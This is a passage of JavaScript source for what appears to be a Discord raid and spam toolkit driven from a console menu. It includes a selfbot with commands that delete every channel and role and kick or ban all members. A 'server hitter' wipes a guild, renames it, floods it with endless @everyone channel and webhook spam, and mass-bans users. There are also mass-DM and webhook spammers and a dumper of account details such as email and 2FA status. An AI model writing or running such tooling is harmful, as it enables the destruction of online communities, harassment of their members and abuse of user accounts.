                          messagesSpammed++;
                          console.log(
                            white("[+] ") +
                              red(
                                `Successfuly sent ${messagesSpammed} messages `
                              ) +
                              white("[+]")
                          );
                        });
                      });
                    }
                  );
                });
              });
            }
            if (option === "12") {
              console.clear();
              rl.question("Enter account token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }

                const selfbot = new Client();
                rl.question("Enter prefix: ", (prefix) => {
                  selfbot.on("ready", () => {
                    if (selfbot.user.bot)
                      return console.log(
                        red(
                          "Token given is a bot token! Note this is a self bot"
                        )
                      );
                    console.clear();
                    let selfLogo = () => {
                      console.log(
                        mainColor(`
                                      
                                      
                                  ╔═╗╔═╗╦  ╔═╗  ╔╗ ╔═╗╔╦╗
                                  ╚═╗║╣ ║  ╠╣   ╠╩╗║ ║ ║ 
                                  ╚═╝╚═╝╩═╝╚    ╚═╝╚═╝ ╩ 
  
                                  Logged in as: ${selfbot.user.tag}
  
                                      `)
                      );
                    };
                    selfLogo();

                    selfbot.on("message", (message) => {
                      if (
                        !message.content.startsWith(prefix) ||
                        message.author.bot
                      )
                        return;
                      if (message.author.id !== selfbot.user.id) return;
                      const args = message.content
                        .slice(prefix.length)
                        .trim()
                        .split(/ +/g);
                      const command = args.shift().toLocaleLowerCase();

                      if (command === "wizz") {
                        try {
                          if (message.channel.type === "dm") {
                            console.log(
                              red("That command can only ben used in servers")
                            );
                            message.delete();
                            return;
                          }
                          message.guild.channels.forEach((x) => {
                            x.delete();
                          });
                          message.guild.pruneMembers(1);
                          message.guild.roles.forEach((x) => x.delete());

                          message.channel.guild.members.forEach((user) => {
                            if (user.manageable) {
                              user.kick().then(() => {
                                console.log(
                                  white(`[+] ${user.user.tag} `) +
                                    blue(`was kicked in`) +
                                    white(`${message.guild.name} [+]`)
                                );
                              });
                            }
                          });

                          message.channel.guild.members.forEach((user) => {
                            if (user.manageable) {
                              user.ban().then(() => {
                                console.log(
                                  white(`[+] ${user.user.tag} `) +
                                    blue(`was banned in`) +
                                    white(`${message.guild.name} [+]`)
                                );
                              });
                            }
                          });
                        } catch (e) {}
                      }

                      if (command === "channels") {
                        message.guild.channels.forEach((x) => x.delete());
                      }

                      if (command === "prune") {
                        message.guild.pruneMembers(1);
                      }

                      if (command === "help") {
                        const embed = new RichEmbed()
                          .setTitle("Self bot")
                          .setAuthor(
                            message.author.tag,
                            message.author.displayAvatarURL
                          )
                          .setDescription("Help Menu")
                          .addField(
                            "Commands",
                            "`wizz` `kick` `ban` `help` `channels` `prune`"
                          )
                          .setFooter("Self bot")
                          .setTimestamp();

                        message.channel.send(embed);
                      }

                      if (command === "kick") {
                        try {
                          if (message.channel.type === "dm") {
                            console.log(
                              red("That command can only ben used in servers")
                            );
                            message.delete();
                            return;
                          }
                          message.delete();
                          message.channel.guild.members.forEach((user) => {
                            if (user.manageable) {
                              user.kick().then(() => {
                                console.log(
                                  white(`[+] ${user.user.tag} `) +
                                    blue(`was kicked in`) +
                                    white(`${message.guild.name} [+]`)
                                );
                              });
                            }
                          });
                        } catch (e) {}
                      }

                      if (command === "ban") {
                        try {
                          if (message.channel.type === "dm") {
                            console.log(
                              red("That command can only ben used in servers")
                            );
                            message.delete();
                            return;
                          }
                          message.delete();
                          message.channel.guild.members.forEach((user) => {
                            if (user.manageable) {
                              user.ban().then(() => {
                                console.log(
                                  white(`[+] ${user.user.tag} `) +
                                    blue(`was banned in`) +
                                    white(`${message.guild.name} [+]`)
                                );
                              });
                            }
                          });
                        } catch (e) {}
                      }
                    });
                  });

                  selfbot.login(token).catch(() => {
                    console.log(red("Incorrect token passed"));
                    setTimeout(() => {
                      ran();
                    }, 2 * 1000);
                    return;
                  });
                });
              });
            }
            if (option === "13") {
              rl.question("Enter token: ", (token) => {
                const slotbot = new Client();
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }

                slotbot.on("ready", () => {
                  console.clear();
                  console.log(
                    mainColor(`
                              
                              
                              ╔═╗╦  ╔═╗╔╦╗╔╗ ╔═╗╔╦╗  ╔═╗╔╗╔╦╔═╗╔═╗╦═╗
                              ╚═╗║  ║ ║ ║ ╠╩╗║ ║ ║   ╚═╗║║║║╠═╝║╣ ╠╦╝
                              ╚═╝╩═╝╚═╝ ╩ ╚═╝╚═╝ ╩   ╚═╝╝╚╝╩╩  ╚═╝╩╚═
  
                                  Logged in as: ${slotbot.user.tag}
                              `)
                  );

                  slotbot.on("message", (message) => {
                    if (message.author.id !== "346353957029019648") return;

                    if (
                      message.content.includes(
                        "Someone just dropped their wallet in this channel! Hurry and pick it up"
                      )
                    ) {
                      message.channel.send("~grab");

                      console.log(
                        white("[+] ") +
                          red(
                            `Slot bot Dropped in ${
                              message.channel.name || "DMs"
                            } `
                          ) +
                          white("[+]")
                      );
                    }
                  });
                });
                slotbot.login(token);
              });
            }
            if (option === "14") {
              rl.question("Enter token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }
                const client = new Client();

                client.on("ready", () => {
                  console.clear();
                  console.log(
                    mainColor(`
  
                                          ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                          ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                          ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                  
                                  `)
                  );
                  console.log("                     Going through user data..");
                  setTimeout(() => {
                    console.clear();
                    console.log(
                      mainColor(`
  
                                          ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                          ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                          ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                          
                                  `)
                    );
                    console.log("                  Looping through servers...");
                  }, 2 * 1000);

                  setTimeout(() => {
                    console.clear();
                    console.log(
                      mainColor(`
  
                                          ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                          ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                          ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                          
                                  `)
                    );
                    console.log(
                      "                    Requesting account info.."
                    );
                  }, 4 * 1000);
                  setTimeout(() => {
                    console.clear();
                    console.log(
                      mainColor(`
                                      
  
                                          ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                          ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                          ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                          
                              
                                  `)
                    );
                    console.log(
                      blue(
                        `                           Username: ${
                          client.user.username
                        } \n \n                           CLIENT INFO: \n \n                           ID: ${
                          client.user.id
                        } \n                           Discrimantor: ${
                          client.user.discriminator
                        } \n                           Tag: ${
                          client.user.tag
                        } \n                           Is bot? ${
                          client.user.bot
                        }  \n                           2FA: ${
                          client.user.mfaEnabled
                        } \n                           Email: ${
                          client.user.email
                        } \n                           Nitro: ${
                          client.user.premium
                        } \n                           Creation date: ${client.user.createdAt.toDateString()} \n \n \n                            ACCOUNT INFO: \n \n \n                           Server count: ${
                          client.guilds.size
                        } \n                           AvatarURL: ${
                          client.user.avatar
                        } \n                           Total relations: ${
                          client.users.size
                        } \n                           Total channels: ${
                          client.channels.size
                        } \n                           Total emojis: ${
                          client.emojis.size
                        } \n                           Friend count: ${
                          client.user.friends.size
                        } \n                           Verified: ${
                          client.user.verified
                        } \n                           Status: ${
                          client.user.presence.status
                        }\n                           Current ping:   ${
                          client.ping
                        }ms \n                           Shard Count: ${
                          client.options.shardCount
                        } \n`
                      )
                    );
                  }, 6 * 1000);
                  setTimeout(() => {
                    console.log(
                      `                                               `
                    );
                    rl.question(
                      "                   Type anything to continue: ",
                      () => {
                        console.clear();
                        ran();
                      }
                    );
                  }, 8 * 1000);
                });
                client.login(token).catch(() => {
                  console.log(red("Incorrect token passed"));
                  setTimeout(() => {
                    ran();
                  }, 2 * 1000);
                  return;
                });
              });
            }
            if (option === "15") {
              presence();
              function presence() {
                rl.question("Enter Presence type: ", (type) => {
                  const types = [
                    "STREAMING",
                    "WATCHING",
                    "LISTENING",
                    "PLAYING",
                  ];
                  if (!types.includes(type.toUpperCase())) {
                    console.log(
                      red(
                        `Incorrect type given \n \n Types:\n ${types.join(
                          "\n"
                        )} `
                      )
                    );

                    setTimeout(() => {
                      presence();
                    }, 1 * 1000);
                    return;
                  }

                  rl.question("Enter status: ", (statuss) => {
                    rl.question("Enter token: ", (token) => {
                      const to = new Client();
                      if (token.startsWith('"') && token.endsWith('"')) {
                        token = token.slice(1, token.length - 1);
                      }
                      to.on("ready", () => {
                        to.user.setStatus("dnd");
                        to.user
                          .setActivity(statuss, {
                            type: type.toUpperCase(),
                            url: "https://www.twitch.tv/",
                          })
                          .then(() => {
                            console.log(
                              mainColor(`
                                      
                                      
                              ╔═╗╦═╗╔═╗╔═╗╔═╗╔╗╔╔═╗╔═╗  ╦ ╦╔═╗╔╦╗╔═╗╔╦╗╔═╗╦═╗
                              ╠═╝╠╦╝║╣ ╚═╗║╣ ║║║║  ║╣   ║ ║╠═╝ ║║╠═╣ ║ ║╣ ╠╦╝
                              ╩  ╩╚═╚═╝╚═╝╚═╝╝╚╝╚═╝╚═╝  ╚═╝╩  ═╩╝╩ ╩ ╩ ╚═╝╩╚═
  
  
                                      logged in as: ${to.user.tag}
                                      Status Type: ${type}
                                      Status: ${statuss}
                                      `)
                            );
                          });
                      });
                      to.login(token).catch((err) => {
                        console.log(red("Incorrect token"));

                        setTimeout(() => {
                          ran();
                        }, 2 * 1000);

                        return;
                      });
                    });
                  });
                });
              }
            }
            if (option === "16") {
              const client = new Client();

              rl.question("Enter token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }

                client.on("ready", () => {
                  console.clear();
                  function s() {
                    console.log(`                                        `);
                    console.log(`                                        `);
                    console.log(`                                        `);

                    console.log(
                      mainColor(
                        `                ╔═╗╦  ╔═╗╦ ╦╔═╗╦═╗╔═╗  ╔╦╗╔╦╗╔═╗╦  ╦ `
                      )
                    );
                    console.log(
                      yellow(
                        `                ╚═╗║  ╠═╣╚╦╝║╣ ╠╦╝╚═╗   ║║║║║╠═╣║  ║ `
                      )
                    );
                    console.log(
                      cyan(
                        `                ╚═╝╩═╝╩ ╩ ╩ ╚═╝╩╚═╚═╝  ═╩╝╩ ╩╩ ╩╩═╝╩═╝`
                      )
                    );

                    console.log(
                      `                                                `
                    );
                    console.log(
                      `                      Ready to dm: ${client.users.size} users               `
                    );
                    console.log(`                                        `);
                    console.log(`                                        `);
                    console.log(`                                        `);
                  }
                  s();
                  rl.question("            Enter Message: ", (msg) => {
                    let count = 0;
                    rl.question("            Type anything to start: ", () => {
                      console.clear();
                      s();
                      client.users.forEach((user) => {
                        try {
                          user
                            .send(msg)
                            .then(() => {
                              count++;
                              console.log(
                                red(`[${count}/${client.users.size}] `) +
                                  white("Message sent to -> ") +
                                  green(user.tag)
                              );
                            })
                            .catch(() => {});
                        } catch {}
                      });
                    });
                  });
                });
                client.login(token).catch((err) => {
                  console.log(
                    white("[+] ") + red("Incorrect token given ") + white("[+]")
                  );
                });
              });
            }
            if (option === "17") {
              console.clear();
              function l() {
                console.log(
                  mainColor(`
  
                              ╦╔═╗  ╔╦╗╔═╗╔═╗╦  
                              ║╠═╝   ║ ║ ║║ ║║  
                              ╩╩     ╩ ╚═╝╚═╝╩═╝
                              
                          `)
                );
              }
              l();
              rl.question("Enter anything to view your IP: ", (enter) => {
                fetch("https://api.ipify.org/?format=json")
                  .then((results) => results.json())
                  .then(async (stats) => {
                    console.clear();
                    l();
                    console.log(
                      white("                       [+] ") +
                        red("You IP Is: ") +
                        white(`${stats.ip} [+]`)
                    );
                    console.log(
                      `                                                `
                    );
                    setTimeout(() => {
                      rl.question(
                        "                     Type anything to continue: ",
                        () => {
                          console.clear();
                          ran();
                        }
                      );
                    }, 2 * 1000);
                  });
              });
            }
            if (option === "18") {
              console.clear();
              function ss() {
                console.log(
                  mainColor(`
  
                              ╔═╗╦ ╦╔╦╗╔═╗  ╦ ╦╦╔╦╗╔╦╗╔═╗╦═╗
                              ╠═╣║ ║ ║ ║ ║  ╠═╣║ ║  ║ ║╣ ╠╦╝
                              ╩ ╩╚═╝ ╩ ╚═╝  ╩ ╩╩ ╩  ╩ ╚═╝╩╚═
                              
                          `)
                );
              }
              ss();
              rl.question("Enter account token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }
                rl.question("Enter Server ID to hit: ", (serv) => {
                  const hitter = new Client();
                  rl.question("Enter server name to set: ", (servName) => {
                    hitter.on("ready", () => {
                      console.clear();
                      ss();
                      rl.question("Type anything to start hit: ", () => {
                        try {
                          try {
                            var server = hitter.guilds.get(serv);
                          } catch (e) {
                            console.log(red("Incorrect Server ID given"));
                            setTimeout(() => {
                              ran();
                            }, 3 * 1000);
                            return;
                          }
                          var today = new Date();
                          var date =
                            today.getFullYear() +
                            "-" +
                            (today.getMonth() + 1) +
                            "-" +
                            today.getDate();
                          if (!server.me.hasPermission("BAN_MEMBERS"))
                            return console.log(
                              red("The permissions given is in sufficent!")
                            );
                          if (!server.me.hasPermission("MANAGE_WEBHOOKS"))
                            return console.log(
                              red("The permissions given is in sufficent!")
                            );
                          if (!server.me.hasPermission("MANAGE_CHANNELS"))
                            return console.log(
                              red("The permissions given is in sufficent!")
                            );
                          if (!server.me.hasPermission("MANAGE_ROLES"))
                            return console.log(
                              red("The permissions given is in sufficent!")
                            );
                          server.channels.forEach((ch) =>
                            ch.delete().then(() => {
                              setTimeout(() => {
                                server.channels.forEach((channel) => {
                                  if (channel.type == "text") {
                                    channel
                                      .createWebhook(
                                        `${hitter.user.username} RUNS YOU`
                                      )
                                      .then((web) => {
                                        console.log(
                                          red(`[${date}] `) +
                                            white(
                                              "Successfully created Webhook -> "
                                            ) +
                                            green(web.name)
                                        );
                                        setInterval(() => {
                                          web
                                            .send(
                                              `@everyone ${hitter.user.username} RUNS YOU`
                                            )
                                            .then(() => {
                                              count++;
                                              console.log(
                                                white("[+] ") +
                                                  red(
                                                    `Successfuly sent ${count} Webhook messages `
                                                  ) +
                                                  white("[+]")
                                              );
                                            })
                                            .catch(() =>
                                              console.log(
                                                white("[+] ") +
                                                  red(
                                                    "Failed to make webhook "
                                                  ) +
                                                  white("[+]")
                                              )
                                            );
                                        });
                                      });
                                  }
                                });
                              }, 5 * 1000);
                            })
                          );
                          server.roles.forEach((role) => {
                            if (role.editable) {
                              role.delete();
                            }
                          });
                          server
                            .setName(servName)
                            .then(() => {
                              console.log(
                                red(`[${date}] `) +
                                  white("Successfully set server name -> ") +
                                  green(servName)
                              );
                            })
                            .catch(() =>
                              console.log(
                                white("[+] ") +
                                  red("Failed to set server name ") +
                                  white("[+]")
                              )
                            );
                          let c = 0;
                          setInterval(async () => {
                            server
                              .createChannel(
                                `${hitter.user.username} beamed you`,
                                {
                                  topic: "Made By Ur dad",
                                }
                              )
                              .then((ch) => {
                                setInterval(() => {
                                  ch.send(
                                    `@everyone ${hitter.user.username} RUNS YOU`
                                  ).then(() => {
                                    c++;
                                    console.log(
                                      white("[+] ") +
                                        red(`Successfuly sent ${c} messages `) +
                                        white("[+]")
                                    );
                                  });
                                });
                                console.log(
                                  red(`[${date}] `) +
                                    white("Successfully created channel -> ") +
                                    green(ch.name)
                                );
                              });
                            if (server.channels.size !== 0) {
                              let count = 0;
                              if (server.roles.size !== 250) {
                                server
                                  .createRole({
                                    name: `${hitter.user.username} RUNS YOU`,
                                    color: "RANDOM",
                                  })
                                  .then((role) => {
                                    console.log(
                                      red(`[${date}] `) +
                                        white("Successfully created Role -> ") +
                                        green(role.name)
                                    );
                                  });
                              } else {
                              }
                            }
                          });

                          server.members.forEach((mm) => {
                            if (mm.bannable) {
                              mm.ban({
                                reason: "Beamed By ur dad",
                              }).then(() => {
                                console.log(
                                  red(
                                    `[${date}] ` +
                                      white(`Successfuly banned -> `) +
                                      green(mm.user.tag)
                                  )
                                );
                              });
                            }
                          });

                          server.channels.forEach((x) =>
                            x.guild.members.forEach((xx) => {
                              if (xx.bannable) {
                                xx.ban({
                                  reason: "Beamedd by ur daddy",
                                }).then(() => {
                                  console.log(
                                    red(
                                      `[${date}] ` +
                                        white(`Successfuly banned -> `) +
                                        green(xx.user.tag)
                                    )
                                  );
                                });
                              }
                            })
                          );
                        } catch (e) {}
                      });
                    });

                    hitter.login(token).catch((err) => {
                      console.log(red("Incorrect token"));
                      setTimeout(() => {
                        ran();
                      }, 2 * 1000);
                      return;
                    });
                  });
                });
              });
            }
            if (option === "19") {
              console.clear();
              console.log(
                mainColor(`
  
                          ╦╔═╗  ╔═╗╦╔╗╔╔═╗╔═╗╦═╗
                          ║╠═╝  ╠═╝║║║║║ ╦║╣ ╠╦╝
                          ╩╩    ╩  ╩╝╚╝╚═╝╚═╝╩╚═
                          
                          `)
              );
              rl.question("        Enter IP to ping: ", (ip) => {
                console.clear();
                console.log(
                  blue(`
                                                                                                                                                                                                                                                
                                                                                                                                              
                      ██████████████████████████████████████                
                    ██▒▒██    ░░██░░██    ░░██▒▒██    ░░██▒▒██              
                  ██▒▒  ░░██▒▒██░░  ░░██░░██▒▒  ░░██░░██▒▒  ▒▒██       
                ████  ▒▒  ████░░  ░░  ██████  ░░  ▒▒██▒▒  ▒▒  ████          
                ██████████████████████████████████████████████████          
                ██▒▒▒▒▒▒▒▒░░██░░░░░░░░░░██▒▒▒▒▒▒▒▒░░██▒▒▒▒▒▒▒▒▒▒██          
                  ██▒▒  ░░░░██░░    ░░░░██▒     ░░░░██▒▒  ▒▒▒▒██            
                    ██▒▒  ░░░░██░░  ░░░░██▒▒  ░░░░██▒▒  ▒▒▒▒██              
                      ██▒▒  ░░██░░  ░░░░██▒▒  ░░░░██▒▒  ▒▒██                
                        ██▒▒  ░░██░░░░░░██▒▒  ░░██▒▒  ▒▒██                  
                          ██▒▒░░██░░░░░░██▒▒  ░░██▒▒▒▒██                    
                            ██▒▒░░██░░░░██▒▒░░██▒▒▒▒██                      
                              ██▒▒██░░░░██▒▒░░██▒▒██                        
                               ██▒▒██░░██▒▒██▒▒██                          
                                  ████░░██▒▒████                            
                                    ██░░██▒▒██                              
                                      ██████                                
                                                                           
                              
                         Enter: CLTL + C to stop process
  
                              `)
                );
                setTimeout(() => {
                  goPinger();
                  let count = 0;
                  if (count === 10) {
                    clearInterval();
                    console.log(
                      mainColor(
                        `Pinged ${ip} ${count} times.. Would you like to continue?`
                      )
                    );
                    rl.question("> ", (aaaaa) => {
                      if (aaaaa === "yes") {
                        goPinger();
                      } else {
                        if (aaaaa === "no") {
                          ran();
                        }
                      }
                    });
                  }
                  let rek = false;
                  function goPinger() {
                    let inttt = setInterval(() => {
                      count++;
                      console.log(red("Pinging."));
                      console.log(white("Pinging.."));
                      console.log(blue("Pinging..."));
                      console.log(cyan("Pinging...."));
                      console.log(mainColor("Pinging....."));
                      console.log(black("Pinging......"));
                      console.log(yellow("Pinging......."));
                      console.log(green("Pinging.........."));
                      console.log(greenBright("Pinging..........."));
                      console.log(blueBright("Pinging..............."));
                    });
                    setTimeout(() => {
                      clearInterval(inttt);
                      console.clear();
                      console.log(
                        mainColor(`
  
                                        ╦╔═╗  ╔═╗╦╔╗╔╔═╗╔═╗╦═╗
                                        ║╠═╝  ╠═╝║║║║║ ╦║╣ ╠╦╝
                                        ╩╩    ╩  ╩╝╚╝╚═╝╚═╝╩╚═
                                        
                                        `)
                      );
                      rl.question(
                        `         Pinged ${ip} ${count} times.. Would you like to continue: `,
                        (aaaaa) => {
                          if (aaaaa === "yes") {
                            console.clear();
                            goPinger();
                          } else {
                            if (aaaaa === "no") {
                              console.clear();
                              ran();
                            }
                          }
                        }
                      );
                    }, 10 * 1000);
                  }
                }, 2 * 1000);
              });
            }
            if (option === "20") {
              console.clear();
              console.log(
                mainColor(`
                          
                          
                          ╔╦╗╔═╗╔═╗╔═╗  ╦ ╦╔═╗╔╗ ╦ ╦╔═╗╔═╗╦╔═  ╔═╗╔═╗╔═╗╔╦╗╔╦╗╔═╗╦═╗
                          ║║║╠═╣╚═╗╚═╗  ║║║║╣ ╠╩╗╠═╣║ ║║ ║╠╩╗  ╚═╗╠═╝╠═╣║║║║║║║╣ ╠╦╝
                          ╩ ╩╩ ╩╚═╝╚═╝  ╚╩╝╚═╝╚═╝╩ ╩╚═╝╚═╝╩ ╩  ╚═╝╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═
  
  
                          `)
              );
              rl.question("Enter token: ", (token) => {
                rl.question("Enter Server ID: ", (servID) => {
                  rl.question(
                    `Enter webhook names (Example: ${ccsMB}-Runs-You ${ccsMB}-runs-all )`,
                    (webNames) => {
                      rl.question(
                        `Enter webhook messages: (Example: ${ccsMB}-Runs-You ${ccsMB}-runs-all ) `,
                        (w) => {
                          console.clear();
                          console.log(
                            mainColor(`
                          
                          
                                      ╔╦╗╔═╗╔═╗╔═╗  ╦ ╦╔═╗╔╗ ╦ ╦╔═╗╔═╗╦╔═  ╔═╗╔═╗╔═╗╔╦╗╔╦╗╔═╗╦═╗
                                      ║║║╠═╣╚═╗╚═╗  ║║║║╣ ╠╩╗╠═╣║ ║║ ║╠╩╗  ╚═╗╠═╝╠═╣║║║║║║║╣ ╠╦╝
                                      ╩ ╩╩ ╩╚═╝╚═╝  ╚╩╝╚═╝╚═╝╩ ╩╚═╝╚═╝╩ ╩  ╚═╝╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═
              
              
                                      `)
                          );
                          rl.question("Type anything to start: ", () => {
                            if (token.startsWith('"') && token.endsWith('"')) {
                              token = token.slice(1, token.length - 1);
                            }
                            try {
                              const webHookSpammer = new Client();

                              const webNamess = webNames.trim().split(/ +/g);
                              const webMessages = w.trim().split(/ +/g);
                              webHookSpammer.on("ready", () => {
                                webHookSpammer.guilds
                                  .get(servID)
                                  .channels.forEach((channel) => {
                                    if (channel.type == "text") {
                                      setInterval(() => {
                                        if (
                                          channel
                                            .fetchWebhooks()
                                            .then((hook) => hook.size) === 10
                                        )
                                          return console.log(
                                            white("[+] ") +
                                              red(
                                                "Channel has to many webhooks "
                                              ) +
                                              white("[+]")
                                          );
                                        channel
                                          .createWebhook(
                                            webNamess[
                                              Math.floor(
                                                Math.random() * webNamess.length
                                              )
                                            ]
                                          )
                                          .then((ww) => {
                                            console.log(
                                              red("[+] ") +
                                                white(
                                                  "Successfully created webhook -> "
                                                ) +
                                                green(ww.name)
                                            );
                                          });
                                      });
                                      setTimeout(async () => {
                                        await (
                                          await webHookSpammer.guilds
                                            .get(servID)
                                            .fetchWebhooks()
                                        ).forEach((ww) =>
                                          ww.send(
                                            "@everyone" +
                                              " " +
                                              webMessages[
                                                Math.floor(
                                                  Math.random() *
                                                    webMessages.length
                                                )
                                              ]
                                          )
                                        );
                                      }, 4 * 1000);
                                    }
                                  });
                              });
                              webHookSpammer.login(token).catch(() => {
                                console.log(red("Incorrct token passed"));
                                setTimeout(() => {
                                  ran();
                                }, 2000);
                              });
                            } catch (e) {}
                          });
                        }
                      );
                    }
                  );
                });
              });
            }
            if (option === "21") {
              console.clear();
              function ll() {
                console.log(
                  mainColor(`
                        
                        
                   ╔╦╗╔═╗╔╦╗╔═╗  ╦═╗╔═╗╔═╗ ╦ ╦╔═╗╔═╗╔╦╗
                    ║║╠═╣ ║ ╠═╣  ╠╦╝║╣ ║═╬╗║ ║║╣ ╚═╗ ║ 
                   ═╩╝╩ ╩ ╩ ╩ ╩  ╩╚═╚═╝╚═╝╚╚═╝╚═╝╚═╝ ╩ 

                        
                        `)
                );
              }
              ll();

              rl.question(
                "                      Type anything to request data: ",
                () => {
                  fetch("https://api.ipify.org/?format=json")
                    .then((results) => results.json())
                    .then(async (stats) => {
                      setTimeout(() => {
                        console.clear();
                        ll();
                        console.log(
                          white(`                      [+] `) +
                            red(
                              `Amount of times used: ${
                                require("./data/data.json")[1].amount
                              }`
                            ) +
                            white(" [+]")
                        );
                      }, 2 * 1000);
                      setTimeout(() => {
                        console.clear();
                        ll();
                        console.log(
                          white(`                      [+] `) +
                            red(`Account logged in: Could't find account `) +
                            white("[+]")
                        );
                      }, 4 * 1000);

                      setTimeout(() => {
                        console.clear();
                        ll();
                        console.log(white());
                      }, 6 * 1000);
                      setTimeout(() => {
                        console.clear();
                        ll();
                        console.log(
                          white("                      [+] ") +
                            red(`Current IP: ${stats.ip} `) +
                            white("[+]")
                        );
                      }, 8 * 1000);
                      setTimeout(() => {
                        console.clear();
                        ll();
                        console.log(
                          white("                      [+] ") +
                            red(
                              `Has acess to hidden tools: ${
                                stats.ip.startsWith("105.226") ? "Yes" : "No"
                              } `
                            ) +
                            white("[+]")
                        );
                      }, 10 * 1000);
                      setTimeout(() => {
                        console.clear();
                        ll();
                        rl.question("Type anything to continue: ", () => {
                          console.clear();
                          ran();
                        });
                      }, 12 * 1000);
                    });
                }
              );
            }
            if (option === "22") {
              console.clear();
              start();
            }
          });
        }
      }
    } else {
      console.log(`      `);
      console.log(`      `);
      console.log(white("                           ╦  ═╗ ╦╔╦╗╔═╗  "));
      console.log(blackBright("                           ║  ╔╩╦╝ "));
      console.log(red("                           ╩═╝╩ ╚═ ╩ ╚═╝  "));
      console.log(`      `);
      console.log(`      `);
      console.log(
        red(
          "Auto lockdown has been enabled.. There is most likely a high breaking bug or a new version that is required!!"
        )
      );
      return;
    }
  });
}
start();
